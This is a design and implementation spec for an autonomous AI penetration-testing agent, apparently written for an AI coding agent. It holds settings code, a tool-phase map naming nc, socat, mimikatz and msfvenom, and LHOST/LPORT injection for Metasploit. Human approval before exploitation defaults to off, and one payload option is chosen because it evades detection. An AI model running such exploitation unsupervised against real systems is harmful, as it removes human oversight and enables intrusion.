# TazoSploit v9 — Comprehensive Implementation Instructions

> **Audience:** AI coding agent (OpenAI o3/o4 xhigh reasoning via Windsurf IDE) implementing TazoSploit v9 upgrades.
> **Date:** 2026-02-15
> **Author:** Architecture planning session (Taz + AI analysis of RedAmon codebase)
> **Prerequisite reading:** `docs/roadmap-to-best.md` (the vision doc this expands upon)
> **Serialization format:** TOON (Token-Oriented Object Notation) — NOT JSON. All new code must use TOON for LLM context, agent output, and structured data. See Section 0.
> **IDE Setup:** Windsurf IDE with BOTH TazoSploit and RedAmon repos mounted side-by-side (see Section 0).
> **Methodology:** GitHub Spec Kit (`github/spec-kit`) for specification-driven development (see Section 0).

---

## Table of Contents

0. [Setup & Conventions](#0-setup-and-conventions)


1. [Project Architecture Overview](#1-project-architecture-overview)
2. [Part 1: RedAmon Settings Deep Dive](#2-part-1-redamon-settings-deep-dive)
3. [Part 2: Architecture Patterns to Implement](#3-part-2-architecture-patterns-to-implement)
4. [Part 3: TazoSploit-Specific Upgrades](#4-part-3-tazosploit-specific-upgrades)
5. [Part 4: Settings Comparison Table](#5-part-4-settings-comparison-table)
6. [**Part 6: Interactive Chat System (CRITICAL)**](#6-part-6-interactive-chat-system)
7. [Part 5: Implementation Plan (Sprint Order)](#7-part-5-implementation-plan-sprint-order)
8. [Appendix: File Reference Map](#8-appendix-file-reference-map)
9. [New Tool Integrations: Empire C2 + OWASP ZAP](#9-new-tool-integrations-empire-c2--owasp-zap)

---

## 0. Setup & Conventions

### 0.1 Windsurf IDE — Dual Repo Mount (MANDATORY)

You MUST have both repositories open simultaneously in Windsurf:

```
Windsurf Workspace:
├── TazoSploit/          ← PRIMARY — this is the codebase you're modifying
│   ├── kali-executor/
│   ├── control-plane/
│   ├── frontend/
│   ├── skills/
│   └── docs/
└── redamon/             ← REFERENCE ONLY — do NOT modify, use as architecture reference
    ├── agentic/         ← orchestrator, state, tools, prompts, websocket_api
    ├── graph_db/        ← Neo4j client, schema, queries
    ├── recon/           ← recon pipeline, project_settings (200+ settings)
    └── webapp/          ← Next.js frontend (UI patterns to mirror)
```

**How to mount RedAmon as reference:**
1. Clone RedAmon: `git clone https://github.com/samugit83/redamon.git` (if not already at `/tmp/redamon`)
2. In Windsurf: File → Add Folder to Workspace → select the `redamon/` directory
3. Both repos should appear in the Windsurf sidebar

**RedAmon reference workflow:**
- When implementing a feature (e.g., phase state machine), FIRST read the equivalent RedAmon file
- Example: Before writing `phase_machine.py`, read `redamon/agentic/orchestrator_helpers/phase.py`
- Example: Before writing `knowledge_graph.py`, read `redamon/graph_db/neo4j_client.py`
- Example: Before writing WebSocket chat, read `redamon/agentic/websocket_api.py`
- Adapt patterns to TazoSploit's architecture (direct Kali CLI, Redis-based state, Python agent loop)
- Do NOT copy RedAmon code verbatim — their patterns use LangGraph/MCP which we don't use

### 0.2 TOON Format — NOT JSON (MANDATORY)

**TazoSploit has migrated from JSON to TOON (Token-Oriented Object Notation).**

TOON is a compact serialization format optimized for LLM context windows. It uses `~40% fewer tokens` than JSON while maintaining equivalent or better model accuracy.

**Package:** `toon_format` (already installed in TazoSploit venv, v0.9.0b1)
**Docs:** https://toonformat.dev
**Python:** https://github.com/toon-format/toon-python

**Rules:**
- ALL LLM context injection MUST use TOON, not JSON
- Agent structured output SHOULD use TOON format
- Vuln tracker data, skill catalogs, execution traces — all TOON
- Redis storage can remain JSON internally (machines don't benefit from TOON)
- API responses to frontend can remain JSON (browser parsing)
- The distinction: **LLM-facing data = TOON**, **machine-facing data = JSON is fine**

**TOON is already integrated** (commit `f4d9d36`):
- Feature flag: `TOON_ENABLED` env var (default: true)
- Integration points: context summary, vuln tracker digest, skill catalog, runtime enforcement
- Helper: `_to_toon()` in `dynamic_agent.py`

**When writing new code that injects data into LLM prompts:**
```python
from toon_format import to_toon

# WRONG — wastes 40% of context tokens
context = json.dumps(data)

# RIGHT — 40% fewer tokens
context = to_toon(data)
```

### 0.3 Spec Kit — Specification-Driven Development (RECOMMENDED)

Use GitHub Spec Kit (`github/spec-kit`) for structured implementation:

**Install:** `uv tool install specify-cli --from git+https://github.com/github/spec-kit.git`

**Workflow for each sprint:**
1. `/speckit.constitution` → Establish TazoSploit development principles (once)
2. `/speckit.specify` → Describe the sprint's features (what/why, not how)
3. `/speckit.plan` → Technical implementation plan with tech stack choices
4. `/speckit.tasks` → Generate dependency-ordered, testable task list
5. Implement against the generated tasks
6. Each task should have a test that proves it works

This ensures structured, testable, incremental delivery instead of big-bang implementation.

### 0.4 Neo4j MCP Server (Available for Development)

A Neo4j Data Modeling MCP server is available via Docker Desktop MCP Toolkit:
- **Docker Image:** `mcp/neo4j-data-modeling`
- **Tools:** 16 tools for creating, validating, and visualizing graph data models
- **Repo:** https://github.com/neo4j-contrib/mcp-neo4j
- Use this during Sprint 2 (Knowledge Graph) to design and validate the Neo4j schema before implementation

### 0.5 Key Differences: TazoSploit vs RedAmon Architecture

| Aspect | TazoSploit | RedAmon |
|--------|-----------|---------|
| **Agent loop** | Custom Python while-loop in `dynamic_agent.py` | LangGraph StateGraph |
| **Tool execution** | Direct Kali CLI via subprocess/pexpect | MCP tools over HTTP/SSE |
| **State management** | Redis keys + Python objects | LangGraph MemorySaver + Neo4j |
| **LLM output** | Free-form text, regex-parsed | Pydantic-validated structured output |
| **Skills** | 125+ YAML skill files with templates | 2-3 MCP tools (curl, naabu, metasploit) |
| **Serialization** | **TOON** (40% token savings) | JSON |
| **Strengths** | Arsenal size, evidence detection, Kali freedom | Graph DB, structured output, production UI |
| **Weakness** | Agent uses only ~8 of 125 tools | Limited tool diversity, MCP overhead |

---

## 1. Project Architecture Overview

### 1.1 TazoSploit Current Architecture

```
┌──────────────────────────────────────────────────────────────┐
│ Host Machine (macOS)                                          │
│ ┌──────────────┐  ┌──────────────┐  ┌───────────────────────┐│
│ │ frontend/    │  │ control-plane│  │ docker-compose.yml    ││
│ │ (Next.js UI) │  │ (API server) │  │ orchestrates all      ││
│ └──────────────┘  └──────┬───────┘  └───────────────────────┘│
│                          │                                    │
│ ┌────────────────────────┼──────────────────────────────────┐│
│ │ Docker Environment     │                                  ││
│ │  ┌─────────┐  ┌────────┴───┐  ┌───────────────────────┐  ││
│ │  │ postgres │  │   redis    │  │ kali-executor         │  ││
│ │  │ (state)  │  │ (pubsub + │  │ ┌───────────────────┐ │  ││
│ │  │          │  │  job queue)│  │ │ dynamic_agent.py  │ │  ││
│ │  └─────────┘  └────────────┘  │ │ (9508 lines)      │ │  ││
│ │                               │ │ - LLM client       │ │  ││
│ │  ┌─────────┐                  │ │ - skill router     │ │  ││
│ │  │  minio  │                  │ │ - command executor  │ │  ││
│ │  │ (files) │                  │ │ - evidence detector │ │  ││
│ │  └─────────┘                  │ └───────────────────┘ │  ││
│ │                               │ ┌───────────────────┐ │  ││
│ │                               │ │ skills/ (125+)    │ │  ││
│ │                               │ └───────────────────┘ │  ││
│ │                               └───────────────────────┘  ││
│ └──────────────────────────────────────────────────────────┘│
└──────────────────────────────────────────────────────────────┘
```

### 1.2 Key File Paths

| File | Purpose | Lines |
|------|---------|-------|
| `kali-executor/open-interpreter/dynamic_agent.py` | Core agent — LLM loop, command execution, evidence detection | ~9508 |
| `kali-executor/open-interpreter/llm_client.py` | LLM API client (OpenAI-compatible) | ~300 |
| `kali-executor/open-interpreter/llm_profiles.py` | LLM profile selection (model routing) | ~200 |
| `kali-executor/open-interpreter/config.py` | Legacy Open Interpreter config | ~100 |
| `kali-executor/open-interpreter/memory.py` | Cross-session memory store | ~200 |
| `skills/skill_router.py` | Phase→category skill filtering | ~60 |
| `skills/skill_loader.py` | YAML skill file loader | ~200 |
| `skills/SKILL_CATALOG.json` | All 125+ skills indexed | ~3000 |
| `docker-compose.yml` | Core platform (postgres, redis, minio, api, kali) | ~200 |
| `control-plane/` | API server, job management, WebSocket | varies |
| `frontend/` | Next.js web UI | varies |

### 1.3 RedAmon Architecture (what we're learning from)

RedAmon (`/tmp/redamon`) uses:
- **LangGraph** StateGraph for agent orchestration
- **Neo4j** knowledge graph for recon data and exploitation results
- **Pydantic** models for every agent state transition
- **MCP tools** (curl, naabu, metasploit) over HTTP/SSE
- **WebSocket** for real-time streaming + approval flows
- **Phase state machine** (informational → exploitation → post_exploitation)

Key files:
- `/tmp/redamon/agentic/state.py` — All Pydantic models (AgentState, LLMDecision, ExecutionStep, TodoItem, etc.)
- `/tmp/redamon/agentic/project_settings.py` — Agent settings with API fetch
- `/tmp/redamon/recon/project_settings.py` — 200+ recon tool settings
- `/tmp/redamon/agentic/orchestrator.py` — LangGraph StateGraph definition
- `/tmp/redamon/agentic/tools.py` — MCP tools + Neo4j query tool
- `/tmp/redamon/agentic/orchestrator_helpers/phase.py` — Phase transition logic
- `/tmp/redamon/agentic/orchestrator_helpers/exploit_writer.py` — Neo4j exploit node creator
- `/tmp/redamon/agentic/websocket_api.py` — WebSocket with approval/question flows
- `/tmp/redamon/graph_db/neo4j_client.py` — Neo4j client with full CRUD + schema init

---

## 2. Part 1: RedAmon Settings Deep Dive

### 2.1 Agent Settings (from `/tmp/redamon/agentic/project_settings.py`)

Every setting below is from `DEFAULT_AGENT_SETTINGS`. Each is fetched per-project from the webapp API at runtime.

#### 2.1.1 LLM Configuration

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `OPENAI_MODEL` | `'gpt-5.2'` | LLM model name, selectable per-project via UI dropdown | Hardcoded via `LLM_MODEL` env var in `config.py`. Profile system in `llm_profiles.py` selects model based on env but NOT per-job. | Add per-job model selection stored in Redis job config. API endpoint to set model. | **Must-have** |
| `INFORMATIONAL_SYSTEM_PROMPT` | `''` (empty) | Custom system prompt APPENDED during informational (recon) phase. Allows per-project recon instructions. | Single `SYSTEM_PROMPT_BASE` constant in `DynamicAgent` class (line ~333). Phase-specific prompts built dynamically in `_build_policy_prompt()` but NOT user-configurable. | Add per-phase custom prompt fields to job config. Load from Redis at each phase transition. | **Must-have** |
| `EXPL_SYSTEM_PROMPT` | `''` (empty) | Custom system prompt for exploitation phase. Lets users provide exploitation-specific guidance. | No equivalent — same system prompt used for all phases, with dynamic policy injection. | Same as above — per-phase custom prompt system. | **Must-have** |
| `POST_EXPL_SYSTEM_PROMPT` | `''` (empty) | Custom system prompt for post-exploitation phase. | No equivalent. | Same as above. | **Must-have** |

**Implementation:**

Create `kali-executor/open-interpreter/project_settings.py`:

```python
# NEW FILE: kali-executor/open-interpreter/project_settings.py
"""
TazoSploit Project Settings — Per-job configuration.

Loaded from Redis at job start. Settings are stored by the API when a user
creates or updates a job. Falls back to DEFAULT_SETTINGS for standalone usage.
"""
import os
import json
import logging
from typing import Any, Optional

logger = logging.getLogger(__name__)

DEFAULT_AGENT_SETTINGS = {
    # LLM Configuration
    'LLM_MODEL': 'auto',  # 'auto' = use LLM_PROFILES system, or specific model name
    'INFORMATIONAL_SYSTEM_PROMPT': '',
    'EXPLOITATION_SYSTEM_PROMPT': '',
    'POST_EXPLOITATION_SYSTEM_PROMPT': '',

    # Phase Configuration
    'ACTIVATE_POST_EXPLOIT_PHASE': True,
    'PHASE_MODE': 'stateful',  # 'stateful' (remembers across objectives) or 'stateless'

    # Payload Direction
    'LHOST': '',
    'LPORT': None,
    'BIND_PORT_ON_TARGET': None,
    'PAYLOAD_USE_HTTPS': False,

    # Agent Limits
    'MAX_ITERATIONS': 50,
    'EXECUTION_TRACE_MEMORY_STEPS': 100,
    'TOOL_OUTPUT_MAX_CHARS': 20000,

    # Approval Gates
    'REQUIRE_APPROVAL_FOR_EXPLOITATION': False,  # Default OFF for TazoSploit (it's designed for autonomous operation)
    'REQUIRE_APPROVAL_FOR_POST_EXPLOITATION': False,

    # Tool Phase Map (maps tool/skill names to allowed phases)
    'TOOL_PHASE_MAP': {},  # Populated from SKILL_CATALOG.json at init

    # Brute Force
    'BRUTE_FORCE_MAX_WORDLIST_ATTEMPTS': 3,
    'BRUTEFORCE_SPEED': 5,  # 1-5 (hydra -t equivalent)

    # LLM Parse
    'LLM_PARSE_MAX_RETRIES': 3,

    # Logging
    'LOG_MAX_MB': 10,
    'LOG_BACKUP_COUNT': 5,

    # Debug
    'CREATE_GRAPH_IMAGE_ON_INIT': False,

    # Neo4j (new)
    'NEO4J_URI': 'bolt://neo4j:7687',
    'NEO4J_USER': 'neo4j',
    'NEO4J_PASSWORD': '',
    'CYPHER_MAX_RETRIES': 3,
}

_settings: Optional[dict] = None

def load_settings_from_redis(redis_client, job_id: str) -> dict:
    """Load job-specific settings from Redis."""
    global _settings
    settings = DEFAULT_AGENT_SETTINGS.copy()
    try:
        raw = redis_client.get(f"job:{job_id}:settings")
        if raw:
            overrides = json.loads(raw)
            settings.update(overrides)
            logger.info(f"Loaded {len(overrides)} setting overrides for job {job_id}")
    except Exception as e:
        logger.warning(f"Failed to load settings from Redis: {e}")
    _settings = settings
    return settings

def get_setting(key: str, default: Any = None) -> Any:
    """Get a single setting value."""
    if _settings is None:
        return DEFAULT_AGENT_SETTINGS.get(key, default)
    return _settings.get(key, default)

def get_settings() -> dict:
    """Get all current settings."""
    return (_settings or DEFAULT_AGENT_SETTINGS).copy()
```

**Integration point in `dynamic_agent.py`:**

```python
# CURRENT (line ~370, __init__):
self.max_iterations = max_iterations  # hardcoded from parameter

# PROPOSED:
from project_settings import load_settings_from_redis, get_setting
# In __init__, after Redis connection:
if self.redis_client and self.job_id:
    load_settings_from_redis(self.redis_client, self.job_id)
self.max_iterations = get_setting('MAX_ITERATIONS', max_iterations)
```

#### 2.1.2 Phase Configuration

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `ACTIVATE_POST_EXPL_PHASE` | `True` | Toggle whether post-exploitation phase exists at all. When False, agent completes after exploitation. | Post-exploit exists but controlled by `_check_post_exploit_depth()` which is a soft check, not a hard gate. | Add toggle to job settings. When False, skip POST_EXPLOIT phase entirely. | **Nice-to-have** |
| `POST_EXPL_PHASE_TYPE` | `'statefull'` | `statefull` = metasploit sessions persist across objectives. `stateless` = restart fresh for each new objective. | Always stateful (single-objective jobs). | Relevant when multi-objective support is added. Implement as job setting. | **Nice-to-have** |

#### 2.1.3 Payload Direction

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `LHOST` | `''` | Attacker IP for reverse shells. Empty = agent asks user. | No centralized config. LHOST is manually set in commands or injected by exploit scripts. The Docker container's IP is used implicitly. | Store in job settings. Auto-inject into metasploit `set LHOST`, reverse shell payloads, etc. | **Must-have** |
| `LPORT` | `None` | Listener port for reverse shells. None = not set. | Same as LHOST — no centralized config. | Store in job settings. Auto-inject into payload generation. | **Must-have** |
| `BIND_PORT_ON_TARGET` | `None` | Port to bind on target for bind shells (alternative to reverse). None = agent asks user. | No equivalent. | Add as job setting. Use when LPORT is not set. | **Nice-to-have** |
| `PAYLOAD_USE_HTTPS` | `False` | Use HTTPS for meterpreter/reverse_https payloads (evades detection). | No equivalent. | Add as toggle. When True, prefer `reverse_https` over `reverse_tcp` in metasploit. | **Nice-to-have** |

**Implementation in `dynamic_agent.py`:**

```python
# NEW: Add to __init__ after settings load
self.lhost = get_setting('LHOST') or os.getenv('LHOST', '')
self.lport = get_setting('LPORT') or os.getenv('LPORT')
self.bind_port = get_setting('BIND_PORT_ON_TARGET')
self.payload_use_https = get_setting('PAYLOAD_USE_HTTPS', False)

# NEW: Auto-inject into metasploit commands
def _inject_payload_config(self, command: str) -> str:
    """Auto-inject LHOST/LPORT into metasploit set commands."""
    if not self._is_metasploit_command(command):
        return command
    lines = command.split('\n')
    injected = []
    for line in lines:
        injected.append(line)
        if line.strip().startswith('use '):
            # After 'use' module, inject payload direction
            if self.lhost:
                injected.append(f'set LHOST {self.lhost}')
            if self.lport:
                injected.append(f'set LPORT {self.lport}')
            if self.payload_use_https:
                injected.append('set PAYLOAD windows/x64/meterpreter/reverse_https')
    return '\n'.join(injected)
```

#### 2.1.4 Agent Limits

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `MAX_ITERATIONS` | `100` | Hard cap on agent loop iterations. Prevents infinite loops. | `max_iterations` parameter in `__init__` (default 50, line ~370). Also env var `MAX_ITERATIONS`. | Keep existing but make configurable per-job via settings. Raise default to 100. | **Must-have** |
| `EXECUTION_TRACE_MEMORY_STEPS` | `100` | How many past execution steps to include in LLM context. Controls context window usage. RedAmon formats the last N steps with full thought/tool/output into the prompt. | `conversation` list holds ALL messages. Digest summarization triggers at 150 message threshold (Spec 008). No configurable window — all or summarized. | Implement structured execution trace (see Part 2F). Make window size configurable. | **Must-have** |
| `TOOL_OUTPUT_MAX_CHARS` | `20000` | Max characters from tool output included in context. Prevents context overflow from verbose commands (like full nmap output). | `_truncate_text()` method (line ~2243) truncates to configurable max with head/tail lines. Default appears to be ~15000 chars. | Centralize truncation limit in settings. Expose as per-job config. | **Nice-to-have** |

#### 2.1.5 Approval Gates

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `REQUIRE_APPROVAL_FOR_EXPLOITATION` | `True` | Agent pauses and asks user before entering exploitation phase. Sends `APPROVAL_REQUEST` via WebSocket. User can: approve, modify plan, or abort. | No approval gates. Agent transitions freely between phases (controlled by `_enforce_phase_gate_before_llm()` and budget limits). | Implement optional approval gate (default OFF for TazoSploit's autonomous design, but available for cautious users). | **Must-have** |
| `REQUIRE_APPROVAL_FOR_POST_EXPLOITATION` | `True` | Same as above but for post-exploitation phase. | No equivalent. | Same implementation as exploitation gate. | **Must-have** |

**Implementation:**

```python
# NEW: In _advance_phase() (line ~7380 of dynamic_agent.py)
def _advance_phase(self, new_phase: str) -> None:
    """Advance to a new phase, optionally requiring user approval."""
    if new_phase not in self.phase_order:
        return

    # Check if approval is required
    needs_approval = False
    if new_phase == 'EXPLOITATION' and get_setting('REQUIRE_APPROVAL_FOR_EXPLOITATION', False):
        needs_approval = True
    elif new_phase == 'POST_EXPLOIT' and get_setting('REQUIRE_APPROVAL_FOR_POST_EXPLOITATION', False):
        needs_approval = True

    if needs_approval and self.websocket:
        # Send approval request via WebSocket
        import asyncio
        asyncio.create_task(self._send_websocket_update('APPROVAL_REQUEST', {
            'from_phase': self.phase_current,
            'to_phase': new_phase,
            'reason': f'Agent wants to transition from {self.phase_current} to {new_phase}',
            'planned_actions': self._get_planned_actions_for_phase(new_phase),
        }))
        self.awaiting_approval = True
        self.pending_phase = new_phase
        return  # Don't transition yet — wait for approval

    self.phase_current = new_phase
```

#### 2.1.6 Tool Phase Map

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `TOOL_PHASE_MAP` | See below | Maps each tool name to list of phases where it's allowed. Tools not in the map are BLOCKED. | `skill_router.py` has `DEFAULT_PHASE_CATEGORY_MAP` mapping phase→skill categories. But this is a CATEGORY mapping, not per-tool. The `_hard_block_scan()` method (line ~6863) blocks specific scan commands in exploit phase. | Implement per-tool phase map loaded from settings. Generate default map from SKILL_CATALOG.json. | **Must-have** |

RedAmon's default TOOL_PHASE_MAP:
```python
'TOOL_PHASE_MAP': {
    'query_graph': ['informational', 'exploitation', 'post_exploitation'],
    'execute_curl': ['informational', 'exploitation', 'post_exploitation'],
    'execute_naabu': ['informational', 'exploitation', 'post_exploitation'],
    'metasploit_console': ['exploitation', 'post_exploitation'],
    'msf_restart': ['exploitation', 'post_exploitation'],
    'web_search': ['informational', 'exploitation', 'post_exploitation'],
}
```

**TazoSploit Equivalent — Generate from 125+ skills:**

```python
# NEW FILE: kali-executor/open-interpreter/tool_phase_map.py
"""
Default tool-to-phase mapping for TazoSploit's 125+ skills.

This maps each tool/command to the phases where it's allowed.
Phase names: RECON, VULN_DISCOVERY, EXPLOITATION, POST_EXPLOIT
"""

DEFAULT_TOOL_PHASE_MAP = {
    # === RECON-ONLY TOOLS (blocked in EXPLOITATION) ===
    'nmap': ['RECON', 'VULN_DISCOVERY'],
    'masscan': ['RECON', 'VULN_DISCOVERY'],
    'naabu': ['RECON', 'VULN_DISCOVERY'],
    'rustscan': ['RECON', 'VULN_DISCOVERY'],
    'arp-scan': ['RECON'],
    'netdiscover': ['RECON'],
    'arping': ['RECON'],

    # === ENUMERATION TOOLS (recon + vuln discovery) ===
    'nikto': ['RECON', 'VULN_DISCOVERY'],
    'gobuster': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],
    'ffuf': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],
    'dirb': ['RECON', 'VULN_DISCOVERY'],
    'dirsearch': ['RECON', 'VULN_DISCOVERY'],
    'feroxbuster': ['RECON', 'VULN_DISCOVERY'],
    'wfuzz': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],
    'whatweb': ['RECON', 'VULN_DISCOVERY'],
    'subfinder': ['RECON'],
    'sublist3r': ['RECON'],
    'amass': ['RECON'],
    'assetfinder': ['RECON'],
    'fierce': ['RECON'],
    'dnsrecon': ['RECON'],
    'dnsenum': ['RECON'],
    'dmitry': ['RECON'],
    'theharvester': ['RECON'],
    'recon-ng': ['RECON'],
    'enum4linux': ['RECON', 'VULN_DISCOVERY'],

    # === VULN SCANNING TOOLS ===
    'nuclei': ['RECON', 'VULN_DISCOVERY'],
    'searchsploit': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],

    # === EXPLOITATION TOOLS (exploitation + post-exploit only) ===
    'sqlmap': ['EXPLOITATION', 'POST_EXPLOIT'],
    'metasploit': ['EXPLOITATION', 'POST_EXPLOIT'],
    'msfconsole': ['EXPLOITATION', 'POST_EXPLOIT'],
    'msfvenom': ['EXPLOITATION', 'POST_EXPLOIT'],
    'hydra': ['EXPLOITATION', 'POST_EXPLOIT'],
    'medusa': ['EXPLOITATION'],
    'crackmapexec': ['EXPLOITATION', 'POST_EXPLOIT'],
    'netexec': ['EXPLOITATION', 'POST_EXPLOIT'],
    'evil-winrm': ['EXPLOITATION', 'POST_EXPLOIT'],
    'impacket-psexec': ['EXPLOITATION', 'POST_EXPLOIT'],
    'impacket-smbexec': ['EXPLOITATION', 'POST_EXPLOIT'],
    'impacket-wmiexec': ['EXPLOITATION', 'POST_EXPLOIT'],
    'impacket-mssqlclient': ['EXPLOITATION', 'POST_EXPLOIT'],
    'impacket-secretsdump': ['POST_EXPLOIT'],
    'john': ['EXPLOITATION', 'POST_EXPLOIT'],
    'hashcat': ['EXPLOITATION', 'POST_EXPLOIT'],
    'responder': ['EXPLOITATION', 'POST_EXPLOIT'],
    'mitm6': ['EXPLOITATION'],
    'bettercap': ['EXPLOITATION'],

    # === POST-EXPLOIT ONLY ===
    'mimikatz': ['POST_EXPLOIT'],
    'bloodhound': ['POST_EXPLOIT'],
    'sharphound': ['POST_EXPLOIT'],
    'rubeus': ['POST_EXPLOIT'],
    'linpeas': ['POST_EXPLOIT'],
    'winpeas': ['POST_EXPLOIT'],

    # === ALL PHASES (utility tools) ===
    'curl': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION', 'POST_EXPLOIT'],
    'wget': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION', 'POST_EXPLOIT'],
    'python': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION', 'POST_EXPLOIT'],
    'python3': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION', 'POST_EXPLOIT'],
    'bash': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION', 'POST_EXPLOIT'],
    'nc': ['EXPLOITATION', 'POST_EXPLOIT'],
    'netcat': ['EXPLOITATION', 'POST_EXPLOIT'],
    'socat': ['EXPLOITATION', 'POST_EXPLOIT'],
    'ssh': ['EXPLOITATION', 'POST_EXPLOIT'],
    'scp': ['POST_EXPLOIT'],
    'websearch': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],
    'docslookup': ['RECON', 'VULN_DISCOVERY', 'EXPLOITATION'],
}

def is_tool_allowed(tool_name: str, phase: str) -> bool:
    """Check if a tool is allowed in the given phase."""
    allowed = DEFAULT_TOOL_PHASE_MAP.get(tool_name.lower(), None)
    if allowed is None:
        # Unknown tools are allowed everywhere (custom scripts, etc.)
        return True
    return phase in allowed

def get_blocked_reason(tool_name: str, phase: str) -> str:
    """Return human-readable reason why a tool is blocked."""
    allowed = DEFAULT_TOOL_PHASE_MAP.get(tool_name.lower(), None)
    if allowed is None:
        return ""
    if phase in allowed:
        return ""
    return (f"⛔ BLOCKED: '{tool_name}' is not allowed in {phase} phase. "
            f"Allowed phases: {', '.join(allowed)}. "
            f"Use an exploitation tool instead.")
```

#### 2.1.7 Brute Force Settings

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `BRUTE_FORCE_MAX_WORDLIST_ATTEMPTS` | `3` | Max number of different wordlists to try before giving up on brute force. | No limit — agent decides when to stop (often never). `_wordlist_violation()` (line ~2262) limits wordlist SIZE but not attempts. | Add configurable limit. After N wordlist attempts, agent must try alternative approach. | **Nice-to-have** |
| `BRUTEFORCE_SPEED` | `5` | Speed setting for brute force tools (1=stealth, 5=max speed). Maps to hydra `-t`, medusa threading, etc. | No centralized speed config. Tools use their defaults. | Add to settings. Inject `-t {speed * 4}` into hydra, appropriate flags for other tools. | **Nice-to-have** |

#### 2.1.8 Neo4j Settings

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `CYPHER_MAX_RETRIES` | `3` | Max retries for Neo4j Cypher queries that fail (LLM-generated queries can have syntax errors). | No Neo4j integration. | Implement as part of Neo4j module (Sprint 2). | **Must-have** |

#### 2.1.9 LLM Parse Retry

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `LLM_PARSE_MAX_RETRIES` | `3` | Max retries when LLM output fails structured parsing (Pydantic validation). With retry, the error is fed back to the LLM to fix its output. | No structured output parsing — agent output is free-form text, parsed by regex in `_extract_executable()` (line ~3030). | Implement as part of structured output system (Sprint 3). | **Must-have** |

#### 2.1.10 Logging & Debug

| Setting | RedAmon Default | What It Does | TazoSploit Current | TazoSploit Target | Priority |
|---------|----------------|--------------|--------------------|--------------------|----------|
| `LOG_MAX_MB` | `10` | Max log file size before rotation. | Logs written to `LOG_DIR` files. No rotation configured. | Add log rotation using Python `RotatingFileHandler`. | **Nice-to-have** |
| `LOG_BACKUP_COUNT` | `5` | Number of rotated log files to keep. | No rotation. | Same as above. | **Nice-to-have** |
| `CREATE_GRAPH_IMAGE_ON_INIT` | `False` | Debug flag — generates Neo4j graph image at startup (useful for development). | No equivalent. | Add as debug flag for Neo4j visualization. | **Skip** |

### 2.2 Recon Settings (from `/tmp/redamon/recon/project_settings.py`)

RedAmon has **200+ recon settings** configurable per-project. TazoSploit doesn't have a separate recon pipeline — recon is done by the agent using Kali tools. However, we should adopt the **per-project configurability pattern** for agent behavior.

#### 2.2.1 Target Configuration

| Setting | RedAmon | TazoSploit Current | TazoSploit Target | Priority |
|---------|---------|--------------------|--------------------|----------|
| `TARGET_DOMAIN` | Target domain for recon | `self.target` set from job objective | Keep as-is | **Already exists** |
| `SUBDOMAIN_LIST` | List of subdomains to scan | No equivalent — agent discovers dynamically | Skip (agent discovers) | **Skip** |
| `VERIFY_DOMAIN_OWNERSHIP` | Require ownership verification before scanning | No equivalent — scoped by ALLOWED_TARGETS | Skip (we use scope allowlist) | **Skip** |

#### 2.2.2 Scan Module Settings

These 200+ settings control individual recon tools (Naabu, httpx, Nuclei, Katana, etc.). Since TazoSploit's agent runs these tools directly via CLI, we don't need tool-specific config files. Instead, we should:

**What to adopt:**
1. **Nuclei severity filter** (`NUCLEI_SEVERITY`) — Tell the agent which severity levels to focus on
2. **Rate limiting** (`*_RATE_LIMIT`) — Global rate limit setting the agent should respect
3. **Scan timeout** (`*_TIMEOUT`) — Per-tool timeout override

**Implementation — add to `project_settings.py`:**

```python
# Add to DEFAULT_AGENT_SETTINGS:
'SCAN_RATE_LIMIT': 0,       # 0 = no limit, >0 = max requests per second
'SCAN_TIMEOUT': 300,         # Default timeout per scan command (seconds)
'VULN_SEVERITY_FILTER': ['critical', 'high', 'medium'],  # Nuclei/scan severity focus
'USE_TOR': False,            # Route scans through Tor
'CUSTOM_HEADERS': [],        # Extra HTTP headers for web tools
```

#### 2.2.3 Security Checks (30+ toggles)

RedAmon has 30+ individual security check toggles (SPF missing, DMARC missing, TLS expiring, etc.). These are NOT relevant for TazoSploit because:
- TazoSploit's agent discovers these dynamically
- The agent uses Nuclei/nmap scripts which already check all of these
- Adding 30 toggles adds complexity without value for an autonomous agent

**Decision: Skip all 30 security check toggles.**

---

## 3. Part 2: Architecture Patterns to Implement

### 3A. Phase State Machine

#### What RedAmon Does

RedAmon has a strict 3-phase state machine defined in `state.py`:

```python
Phase = Literal["informational", "exploitation", "post_exploitation"]
```

Phase transitions are managed in `orchestrator_helpers/phase.py`:
1. **`classify_attack_path()`** — LLM classifies user intent as `cve_exploit` or `brute_force_credential_guess` and determines `required_phase`
2. **`determine_phase_for_new_objective()`** — Decides whether to auto-downgrade (safe) or require approval (upgrade)
3. Phase transition requests go through WebSocket approval if `REQUIRE_APPROVAL_FOR_EXPLOITATION` is True
4. Tools are phase-gated via `TOOL_PHASE_MAP` — calling a blocked tool returns an error

#### What TazoSploit Has Now

